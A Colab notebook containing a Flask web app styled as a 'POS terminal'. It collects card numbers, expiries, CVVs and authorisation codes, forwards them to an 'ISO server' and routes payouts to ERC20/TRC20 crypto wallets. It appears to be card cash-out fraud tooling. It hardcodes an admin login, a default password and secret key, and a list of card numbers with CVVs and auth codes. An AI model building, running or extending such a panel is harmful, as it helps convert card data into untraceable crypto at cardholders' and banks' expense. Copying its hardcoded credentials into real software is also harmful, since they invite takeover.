{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Lloydsgit/Defender/blob/main/app.py\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# app.py\n",
        "from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify, g\n",
        "import random, logging, qrcode, io, os, json, hashlib, re\n",
        "from datetime import datetime, date, timedelta\n",
        "from functools import wraps\n",
        "import requests # <--- THIS LINE IS CRUCIAL AND MUST BE PRESENT\n",
        "\n",
        "# --- Firebase and Firestore Imports ---\n",
        "import firebase_admin\n",
        "from firebase_admin import credentials, firestore, auth\n",
        "\n",
        "app = Flask(__name__)\n",
        "app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'blackrock_secret_key_8583_DEFAULT_DO_NOT_USE_IN_PROD')\n",
        "logging.basicConfig(level=logging.INFO)\n",
        "\n",
        "# Configuration\n",
        "USERNAME = \"blackrockadmin\"\n",
        "PASSWORD_FILE = \"password.json\"\n",
        "\n",
        "# --- Firebase Initialization (for Canvas environment) ---\n",
        "firebase_config = json.loads(os.environ.get('__firebase_config', '{}'))\n",
        "initial_auth_token = os.environ.get('__initial_auth_token')\n",
        "app_id = os.environ.get('__app_id', 'default-app-id')\n",
        "\n",
        "db = None\n",
        "current_user_id = None\n",
        "\n",
        "if firebase_config:\n",
        "    try:\n",
        "        cred = credentials.Certificate(firebase_config)\n",
        "        firebase_admin.initialize_app(cred)\n",
        "        db = firestore.client()\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firebase initialized successfully.\")\n",
        "\n",
        "        if initial_auth_token:\n",
        "            try:\n",
        "                user = auth.verify_id_token(initial_auth_token)\n",
        "                current_user_id = user['uid']\n",
        "                print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Signed in with custom token. User ID: {current_user_id}\")\n",
        "            except Exception as e:\n",
        "                print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error verifying custom auth token: {e}\")\n",
        "                current_user_id = \"anonymous_\" + os.urandom(16).hex()\n",
        "                print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Signed in anonymously. User ID: {current_user_id}\")\n",
        "        else:\n",
        "            current_user_id = \"anonymous_\" + os.urandom(16).hex()\n",
        "            print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: No initial auth token. Signed in anonymously. User ID: {current_user_id}\")\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error initializing Firebase: {e}\")\n",
        "        db = None\n",
        "else:\n",
        "    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firebase config not found. Firestore will not be available.\")\n",
        "\n",
        "# --- Ensure password file exists and is initialized with the correct hash ---\n",
        "if not os.path.exists(PASSWORD_FILE):\n",
        "    with open(PASSWORD_FILE, \"w\") as f:\n",
        "        hashed = hashlib.sha256(\"Br_3339\".encode()).hexdigest()\n",
        "        json.dump({\"password\": hashed}, f)\n",
        "    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Initialized password.json with default password.\")\n",
        "else:\n",
        "    try:\n",
        "        with open(PASSWORD_FILE, \"r\") as f:\n",
        "            stored_data = json.load(f)\n",
        "            if \"password\" not in stored_data:\n",
        "                raise ValueError(\"Password key missing in password.json\")\n",
        "    except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error reading password.json ({e}). Re-initializing.\")\n",
        "        with open(PASSWORD_FILE, \"w\") as f:\n",
        "            hashed = hashlib.sha256(\"Br_3339\".encode()).hexdigest()\n",
        "            json.dump({\"password\": hashed}, f)\n",
        "\n",
        "\n",
        "def check_password(raw):\n",
        "    with open(PASSWORD_FILE) as f:\n",
        "        stored = json.load(f)['password']\n",
        "    return hashlib.sha256(raw.encode()).hexdigest() == stored\n",
        "\n",
        "def set_password(newpass):\n",
        "    with open(PASSWORD_FILE, \"w\") as f:\n",
        "        hashed = hashlib.sha256(newpass.encode()).hexdigest()\n",
        "        json.dump({\"password\": hashed}, f)\n",
        "    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Password changed successfully.\")\n",
        "\n",
        "def login_required(f):\n",
        "    @wraps(f)\n",
        "    def decorated(*args, **kwargs):\n",
        "        if not session.get(\"logged_in\"):\n",
        "            flash(\"You must be logged in to access this page.\", \"error\")\n",
        "            return redirect(url_for(\"login\"))\n",
        "        return f(*args, **kwargs)\n",
        "    return decorated\n",
        "\n",
        "@app.before_request\n",
        "def set_global_user_id():\n",
        "    g.user_id = current_user_id if current_user_id else \"anonymous\"\n",
        "\n",
        "\n",
        "# Dummy card database (kept as is from your sample)\n",
        "DUMMY_CARDS = {\n",
        "    \"4114755393849011\": {\"expiry\": \"0926\", \"cvv\": \"363\", \"auth\": \"1942\", \"type\": \"POS-101.1\"},\n",
        "    \"4000123412341234\": {\"expiry\": \"1126\", \"cvv\": \"123\", \"auth\": \"4021\", \"type\": \"POS-101.1\"},\n",
        "    \"4117459374038454\": {\"expiry\": \"1026\", \"cvv\": \"258\", \"auth\": \"384726\", \"type\": \"POS-101.4\"},\n",
        "    \"4123456789012345\": {\"expiry\": \"0826\", \"cvv\": \"852\", \"auth\": \"495128\", \"type\": \"POS-101.4\"},\n",
        "    \"5454957994741066\": {\"expiry\": \"1126\", \"cvv\": \"746\", \"auth\": \"627192\", \"type\": \"POS-101.6\"},\n",
        "    \"6011000990131077\": {\"expiry\": \"0825\", \"cvv\": \"330\", \"auth\": \"8765\", \"type\": \"POS-101.7\"},\n",
        "    \"3782822463101088\": {\"expiry\": \"1226\", \"cvv\": \"1059\", \"auth\": \"0000\", \"type\": \"POS-101.8\"},\n",
        "    \"3530760473041099\": {\"expiry\": \"0326\", \"cvv\": \"244\", \"auth\": \"712398\", \"type\": \"POS-201.1\"},\n",
        "    \"4114938274651920\": {\"expiry\": \"0926\", \"cvv\": \"463\", \"auth\": \"3127\", \"type\": \"POS-101.1\"},\n",
        "    \"4001948263728191\": {\"expiry\": \"1026\", \"cvv\": \"291\", \"auth\": \"574802\", \"type\": \"POS-101.4\"},\n",
        "    \"6011329481720394\": {\"expiry\": \"0825\", \"cvv\": \"310\", \"auth\": \"8891\", \"type\": \"POS-101.7\"},\n",
        "    \"378282246310106\":  {\"expiry\": \"1226\", \"cvv\": \"1439\", \"auth\": \"0000\", \"type\": \"POS-101.8\"},\n",
        "    \"3531540982734612\": {\"expiry\": \"0326\", \"cvv\": \"284\", \"auth\": \"914728\", \"type\": \"POS-201.1\"},\n",
        "    \"5456038291736482\": {\"expiry\": \"1126\", \"cvv\": \"762\", \"auth\": \"695321\", \"type\": \"POS-201.3\"},\n",
        "    \"4118729301748291\": {\"expiry\": \"1026\", \"cvv\": \"249\", \"auth\": \"417263\", \"type\": \"POS-201.5\"}\n",
        "}\n",
        "\n",
        "PROTOCOLS = {\n",
        "    \"POS Terminal -101.1 (4-digit approval)\": 4,\n",
        "    \"POS Terminal -101.4 (6-digit approval)\": 6,\n",
        "    \"POS Terminal -101.6 (Pre-authorization)\": 6,\n",
        "    \"POS Terminal -101.7 (4-digit approval)\": 4,\n",
        "    \"POS Terminal -101.8 (PIN-LESS transaction)\": 4,\n",
        "    \"POS Terminal -201.1 (6-digit approval)\": 6,\n",
        "    \"POS Terminal -201.3 (6-digit approval)\": 6,\n",
        "    \"POS Terminal -201.5 (6-digit approval)\": 6\n",
        "}\n",
        "\n",
        "FIELD_39_RESPONSES = {\n",
        "    \"00\": \"Transaction Approved\",\n",
        "    \"05\": \"Do Not Honor\",\n",
        "    \"14\": \"Terminal unable to resolve encrypted session state. Contact card issuer\",\n",
        "    \"54\": \"Expired Card\",\n",
        "    \"82\": \"Invalid CVV\",\n",
        "    \"91\": \"Issuer Inoperative\",\n",
        "    \"92\": \"Invalid Terminal Protocol\",\n",
        "    \"99\": \"General Error / Server Timeout\"\n",
        "}\n",
        "\n",
        "# --- Configuration for ISOserver.py communication ---\n",
        "ISO_SERVER_URL = os.environ.get('ISO_SERVER_URL')\n",
        "if not ISO_SERVER_URL:\n",
        "    logging.error(\"ISO_SERVER_URL environment variable is not set. Please configure it for production.\")\n",
        "    ISO_SERVER_URL = 'http://127.0.0.1:5000/process_payment'\n",
        "\n",
        "# --- Default Payout Wallets (from environment variables) ---\n",
        "DEFAULT_ERC20_WALLET = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')\n",
        "DEFAULT_TRC20_WALLET = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')\n",
        "\n",
        "# --- Daily Transaction Limit per Terminal ---\n",
        "DAILY_LIMIT_PER_TERMINAL = 10_000_000 # 10 Million USD/EUR equivalent\n",
        "\n",
        "@app.route('/')\n",
        "def home():\n",
        "    return redirect(url_for('login'))\n",
        "\n",
        "@app.route('/login', methods=['GET', 'POST'])\n",
        "def login():\n",
        "    if request.method == 'POST':\n",
        "        user = request.form.get('username')\n",
        "        passwd = request.form.get('password')\n",
        "        if user == USERNAME and check_password(passwd):\n",
        "            session['logged_in'] = True\n",
        "            session['terminal_id'] = f\"TERM-{os.urandom(4).hex()}\"\n",
        "            session['daily_amount_spent'] = 0.0\n",
        "            session['last_transaction_date'] = date.today().isoformat()\n",
        "            flash(\"Logged in successfully!\", \"success\")\n",
        "            return redirect(url_for('dashboard'))\n",
        "        flash(\"Invalid username or password.\", \"error\")\n",
        "    return render_template('login.html')\n",
        "\n",
        "@app.route('/logout')\n",
        "def logout():\n",
        "    session.clear()\n",
        "    flash(\"You have been logged out.\", \"info\")\n",
        "    return redirect(url_for('login'))\n",
        "\n",
        "@app.route('/dashboard')\n",
        "@login_required\n",
        "def dashboard():\n",
        "    return render_template('dashboard.html')\n",
        "\n",
        "@app.route('/change-password', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def change_password():\n",
        "    if request.method == 'POST':\n",
        "        current = request.form.get('current')\n",
        "        new = request.form.get('new')\n",
        "        confirm_new = request.form.get('confirm_new')\n",
        "\n",
        "        if not current or not new or not confirm_new:\n",
        "            flash(\"All fields are required.\", \"error\")\n",
        "            return render_template('change_password.html')\n",
        "\n",
        "        if not check_password(current):\n",
        "            flash(\"Current password incorrect.\", \"error\")\n",
        "            return render_template('change_password.html')\n",
        "\n",
        "        if new != confirm_new:\n",
        "            flash(\"New password and confirmation do not match.\", \"error\")\n",
        "            return render_template('change_password.html')\n",
        "\n",
        "        if len(new) < 8:\n",
        "            flash(\"New password must be at least 8 characters long.\", \"error\")\n",
        "            return render_template('change_password.html')\n",
        "\n",
        "        set_password(new)\n",
        "        flash(\"Password changed successfully!\", \"success\")\n",
        "        return redirect(url_for('login'))\n",
        "    return render_template('change_password.html')\n",
        "\n",
        "@app.route('/forgot-password', methods=['GET', 'POST'])\n",
        "def forgot_password():\n",
        "    if request.method == 'POST':\n",
        "        flash(\"Forgot password functionality is not implemented in this demo. Please contact support.\", \"info\")\n",
        "        return redirect(url_for('login'))\n",
        "    return render_template('forgot_password.html')\n",
        "\n",
        "@app.route('/protocol', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def protocol():\n",
        "    if request.method == 'POST':\n",
        "        selected = request.form.get('protocol')\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Protocol selected from form: '{selected}'\")\n",
        "\n",
        "        if selected not in PROTOCOLS:\n",
        "            flash(f\"Invalid protocol selected: {selected}\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"92\", reason=FIELD_39_RESPONSES[\"92\"]))\n",
        "\n",
        "        session['protocol'] = selected\n",
        "        session['code_length'] = PROTOCOLS[selected]\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Session 'protocol' set to: '{session['protocol']}'\")\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Session 'code_length' set to: {session['code_length']}\")\n",
        "\n",
        "        return redirect(url_for('amount'))\n",
        "    return render_template('protocol.html', protocols=PROTOCOLS.keys())\n",
        "\n",
        "@app.route('/amount', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def amount():\n",
        "    if request.method == 'POST':\n",
        "        amount_str = request.form.get('amount')\n",
        "        currency = request.form.get('currency')\n",
        "\n",
        "        if not currency or currency not in ['USD', 'EUR']:\n",
        "            flash(\"Please select a valid currency.\", \"error\")\n",
        "            return render_template('amount.html')\n",
        "\n",
        "        try:\n",
        "            amount_float = float(amount_str)\n",
        "            if amount_float <= 0:\n",
        "                flash(\"Amount must be a positive number.\", \"error\")\n",
        "                return render_template('amount.html')\n",
        "\n",
        "            # --- Daily Limit Check ---\n",
        "            current_date = date.today()\n",
        "            last_txn_date_str = session.get('last_transaction_date')\n",
        "\n",
        "            if last_txn_date_str and date.fromisoformat(last_txn_date_str) < current_date:\n",
        "                session['daily_amount_spent'] = 0.0\n",
        "                session['last_transaction_date'] = current_date.isoformat()\n",
        "\n",
        "            current_spent = session.get('daily_amount_spent', 0.0)\n",
        "            if (current_spent + amount_float) > DAILY_LIMIT_PER_TERMINAL:\n",
        "                flash(f\"Daily transaction limit of {DAILY_LIMIT_PER_TERMINAL:,.2f} {currency} exceeded for this terminal.\", \"error\")\n",
        "                return render_template('amount.html')\n",
        "\n",
        "            session['amount'] = amount_str\n",
        "            session['currency'] = currency\n",
        "            session['daily_amount_spent'] = current_spent + amount_float\n",
        "\n",
        "        except ValueError:\n",
        "            flash(\"Invalid amount. Please enter a number.\", \"error\")\n",
        "            return render_template('amount.html')\n",
        "        return redirect(url_for('payout'))\n",
        "    return render_template('amount.html')\n",
        "\n",
        "@app.route('/payout', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def payout():\n",
        "    if request.method == 'POST':\n",
        "        method = request.form['method']\n",
        "        session['payout_type'] = method\n",
        "\n",
        "        if method == 'ERC20':\n",
        "            wallet = DEFAULT_ERC20_WALLET\n",
        "        elif method == 'TRC20':\n",
        "            wallet = DEFAULT_TRC20_WALLET\n",
        "        else:\n",
        "            flash(\"Invalid payout method selected.\", \"error\")\n",
        "            return redirect(url_for('payout'))\n",
        "\n",
        "        session['wallet'] = wallet\n",
        "\n",
        "        return redirect(url_for('card'))\n",
        "\n",
        "    return render_template('payout.html',\n",
        "                           default_erc20_wallet=DEFAULT_ERC20_WALLET,\n",
        "                           default_trc20_wallet=DEFAULT_TRC20_WALLET)\n",
        "\n",
        "@app.route('/card', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def card():\n",
        "    if request.method == 'POST':\n",
        "        pan = request.form['pan'].replace(\" \", \"\")\n",
        "        exp = request.form['expiry'].replace(\"/\", \"\")\n",
        "        cvv = request.form['cvv']\n",
        "        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})\n",
        "\n",
        "        if pan.startswith(\"4\"):\n",
        "            session['card_type'] = \"VISA\"\n",
        "        elif pan.startswith(\"5\"):\n",
        "            session['card_type'] = \"MASTERCARD\"\n",
        "        elif pan.startswith(\"3\"):\n",
        "            session['card_type'] = \"AMEX\"\n",
        "        elif pan.startswith(\"6\"):\n",
        "            session['card_type'] = \"DISCOVER\"\n",
        "        else:\n",
        "            session['card_type'] = \"UNKNOWN\"\n",
        "\n",
        "        return redirect(url_for('auth'))\n",
        "\n",
        "    return render_template('card.html')\n",
        "\n",
        "@app.route('/auth', methods=['GET', 'POST'])\n",
        "@login_required\n",
        "def auth():\n",
        "    expected_length = session.get('code_length', 6)\n",
        "    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Auth route - Retrieved 'code_length' from session: {expected_length}\")\n",
        "\n",
        "    if request.method == 'POST':\n",
        "        code = request.form.get('auth')\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Auth route - Received auth code: '{code}', Length: {len(code)}\")\n",
        "\n",
        "        if len(code) != expected_length:\n",
        "            flash(f\"Authorization code must be {expected_length} digits.\", \"error\")\n",
        "            return render_template('auth.html', warning=f\"Code must be {expected_length} digits.\", expected_length=expected_length)\n",
        "\n",
        "        card_data_for_server = {\n",
        "            'pan': session.get('pan'),\n",
        "            'amount': session.get('amount'),\n",
        "            'expiry': session.get('exp'),\n",
        "            'cvv': session.get('cvv'),\n",
        "            'currency': session.get('currency', 'USD'),\n",
        "            'payout_type': session.get('payout_type'),\n",
        "            'wallet': session.get('wallet')\n",
        "        }\n",
        "\n",
        "        print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Sending payment request to ISOserver.py at {ISO_SERVER_URL}...\")\n",
        "        try:\n",
        "            response = requests.post(ISO_SERVER_URL, json=card_data_for_server, timeout=30)\n",
        "            response.raise_for_status()\n",
        "            payment_result = response.json()\n",
        "            print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Received response from ISOserver.py: {payment_result}\")\n",
        "\n",
        "            status = payment_result.get(\"status\")\n",
        "            message = payment_result.get(\"message\", \"Unknown status\")\n",
        "            transaction_id = payment_result.get(\"transaction_id\", f\"TXN{random.randint(100000, 999999)}\")\n",
        "            payout_tx_hash = payment_result.get(\"payout_tx_hash\", \"\")\n",
        "            field39_resp = payment_result.get(\"field39\", \"XX\")\n",
        "\n",
        "            session.update({\n",
        "                \"txn_id\": transaction_id,\n",
        "                \"arn\": payment_result.get(\"arn\", f\"ARN{random.randint(100000000000, 999999999999)}\"),\n",
        "                \"timestamp\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n",
        "                \"field39\": field39_resp,\n",
        "                \"payout_tx_hash\": payout_tx_hash\n",
        "            })\n",
        "\n",
        "            if db and current_user_id:\n",
        "                try:\n",
        "                    transactions_ref = db.collection('artifacts').document(app_id).collection('users').document(current_user_id).collection('transactions')\n",
        "                    transactions_ref.add({\n",
        "                        'terminal_id': session.get('terminal_id'),\n",
        "                        'transaction_id': transaction_id,\n",
        "                        'amount': float(session.get('amount')),\n",
        "                        'currency': session.get('currency'),\n",
        "                        'card_pan_last4': session.get('pan')[-4:],\n",
        "                        'payout_type': session.get('payout_type'),\n",
        "                        'merchant_wallet': session.get('wallet'),\n",
        "                        'status': status,\n",
        "                        'message': message,\n",
        "                        'payout_tx_hash': payout_tx_hash,\n",
        "                        'iso_field39': field39_resp,\n",
        "                        'timestamp': firestore.SERVER_TIMESTAMP\n",
        "                    })\n",
        "                    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Transaction logged to Firestore.\")\n",
        "                except Exception as e:\n",
        "                    print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error logging transaction to Firestore: {e}\")\n",
        "                    flash(\"Failed to log transaction history.\", \"warning\")\n",
        "            else:\n",
        "                print(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firestore not initialized or user not authenticated. Skipping transaction logging.\")\n",
        "\n",
        "\n",
        "            if status == \"approved\":\n",
        "                flash(\"Payment Approved and Payout Initiated!\", \"success\")\n",
        "                return redirect(url_for('success'))\n",
        "            elif status == \"approved_payout_failed\" or status == \"approved_payout_timeout\" or status == \"approved_payout_connection_error\":\n",
        "                flash(f\"Payment Approved, but Payout Failed: {message}. Manual reconciliation required.\", \"warning\")\n",
        "                return redirect(url_for('success'))\n",
        "            else:\n",
        "                flash(f\"Payment Rejected: {message}\", \"error\")\n",
        "                return redirect(url_for('rejected', code=field39_resp, reason=message))\n",
        "\n",
        "        except requests.exceptions.Timeout:\n",
        "            logging.error(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Request to ISOserver.py timed out after 30 seconds.\")\n",
        "            flash(\"Payment request timed out. Please check server status.\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"99\", reason=\"Server Timeout\"))\n",
        "        except requests.exceptions.ConnectionError as e:\n",
        "            logging.error(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Could not connect to ISOserver.py at {ISO_SERVER_URL}: {e}\")\n",
        "            flash(f\"Could not connect to payment gateway. Server might be down: {e}\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"99\", reason=\"Gateway Unreachable\"))\n",
        "        except requests.exceptions.RequestException as e:\n",
        "            logging.error(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: An error occurred during the request: {e}\", exc_info=True)\n",
        "            flash(f\"An error occurred during payment processing: {e}\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"99\", reason=\"Payment Processing Error\"))\n",
        "        except json.JSONDecodeError:\n",
        "            logging.error(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Invalid JSON response from ISOserver.py.\", exc_info=True)\n",
        "            flash(\"Invalid response from payment gateway.\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"99\", reason=\"Invalid Server Response\"))\n",
        "        except Exception as e:\n",
        "            logging.critical(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Critical Error: Unexpected error in auth route: {e}\", exc_info=True)\n",
        "            flash(f\"An unexpected error occurred: {e}\", \"error\")\n",
        "            return redirect(url_for('rejected', code=\"99\", reason=\"Unexpected Error\"))\n",
        "\n",
        "    return render_template('auth.html', expected_length=expected_length) # Pass expected_length for GET requests too\n",
        "\n",
        "@app.route('/success')\n",
        "@login_required\n",
        "def success():\n",
        "    payout_tx_hash = session.get(\"payout_tx_hash\", \"N/A\")\n",
        "    return render_template('success.html',\n",
        "        txn_id=session.get(\"txn_id\"),\n",
        "        arn=session.get(\"arn\"),\n",
        "        pan=session.get(\"pan\", \"\")[-4:],\n",
        "        amount=session.get(\"amount\"),\n",
        "        timestamp=session.get(\"timestamp\"),\n",
        "        payout_tx_hash=payout_tx_hash\n",
        "    )\n",
        "\n",
        "@app.route(\"/receipt\")\n",
        "def receipt():\n",
        "    raw_protocol = session.get(\"protocol\", \"\")\n",
        "    match = re.search(r\"-(\\d+\\.\\d+)\\s+\\((\\d+)-digit\", raw_protocol)\n",
        "    if match:\n",
        "        protocol_version = match.group(1)\n",
        "        auth_digits = int(match.group(2))\n",
        "    else:\n",
        "        protocol_version = \"Unknown\"\n",
        "        auth_digits = 4\n",
        "\n",
        "    raw_amount = session.get(\"amount\", \"0\")\n",
        "    if raw_amount and raw_amount.replace('.', '', 1).isdigit():\n",
        "        amount_fmt = f\"{float(raw_amount):,.2f}\"\n",
        "    else:\n",
        "        amount_fmt = \"0.00\"\n",
        "\n",
        "    payout_tx_hash = session.get(\"payout_tx_hash\", \"N/A\")\n",
        "\n",
        "    return render_template(\"receipt.html\",\n",
        "        txn_id=session.get(\"txn_id\"),\n",
        "        arn=session.get(\"arn\"),\n",
        "        pan=session.get(\"pan\")[-4:],\n",
        "        amount=amount_fmt,\n",
        "        payout=session.get(\"payout_type\"),\n",
        "        wallet=session.get(\"wallet\"),\n",
        "        auth_code=\"*\" * auth_digits,\n",
        "        iso_field_18=\"5999\",\n",
        "        iso_field_25=\"00\",\n",
        "        field39=session.get(\"field39\", \"XX\"),\n",
        "        card_type=session.get(\"card_type\", \"VISA\"),\n",
        "        protocol_version=protocol_version,\n",
        "        timestamp=session.get(\"timestamp\"),\n",
        "        payout_tx_hash=payout_tx_hash\n",
        "    )\n",
        "\n",
        "@app.route('/rejected')\n",
        "def rejected():\n",
        "    return render_template('rejected.html',\n",
        "        code=request.args.get(\"code\"),\n",
        "        reason=request.args.get(\"reason\", \"Transaction Declined\")\n",
        "    )\n",
        "\n",
        "@app.route('/offline')\n",
        "@login_required\n",
        "def offline():\n",
        "    return render_template('offline.html')\n",
        "\n",
        "@app.route('/transactions')\n",
        "@login_required\n",
        "def transactions_dashboard():\n",
        "    if not db or not current_user_id:\n",
        "        flash(\"Transaction history is not available. Firestore not initialized or user not authenticated.\", \"error\")\n",
        "        return render_template('transactions.html', transactions=[])\n",
        "\n",
        "    try:\n",
        "        transactions_ref = db.collection('artifacts').document(app_id).collection('users').document(current_user_id).collection('transactions')\n",
        "        query = transactions_ref.order_by('timestamp', direction=firestore.Query.DESCENDING).limit(100)\n",
        "\n",
        "        transactions = []\n",
        "        docs = query.stream()\n",
        "        for doc in docs:\n",
        "            txn = doc.to_dict()\n",
        "            if 'timestamp' in txn and hasattr(txn['timestamp'], 'strftime'):\n",
        "                txn['timestamp'] = txn['timestamp'].strftime('%Y-%m-%d %H:%M:%S')\n",
        "            transactions.append(txn)\n",
        "        return render_template('transactions.html', transactions=transactions)\n",
        "    except Exception as e:\n",
        "        logging.error(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error fetching transactions from Firestore: {e}\", exc_info=True)\n",
        "        flash(\"Failed to load transaction history.\", \"error\")\n",
        "        return render_template('transactions.html', transactions=[])\n",
        "\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    port = int(os.environ.get('PORT', 5000))\n",
        "    app.run(host='0.0.0.0', port=port, debug=False)"
      ],
      "outputs": [
        {
          "output_type": "error",
          "ename": "ModuleNotFoundError",
          "evalue": "No module named 'qrcode'",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
            "\u001b[0;32m/tmp/ipython-input-1-41435594.py\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;31m# app.py\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mflask\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mFlask\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrender_template\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrequest\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mredirect\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msession\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0murl_for\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mflash\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mjsonify\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mg\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mrandom\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlogging\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mqrcode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mio\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mos\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mjson\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhashlib\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mre\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mdatetime\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mdatetime\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdate\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimedelta\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mfunctools\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mwraps\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'qrcode'",
            "",
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"
          ],
          "errorDetails": {
            "actions": [
              {
                "action": "open_url",
                "actionText": "Open Examples",
                "url": "/notebooks/snippets/importing_libraries.ipynb"
              }
            ]
          }
        }
      ],
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 383
        },
        "id": "xiRBGMmhssHb",
        "outputId": "8bc4f155-d0fd-430f-e3dd-5ef8811d1925"
      }
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}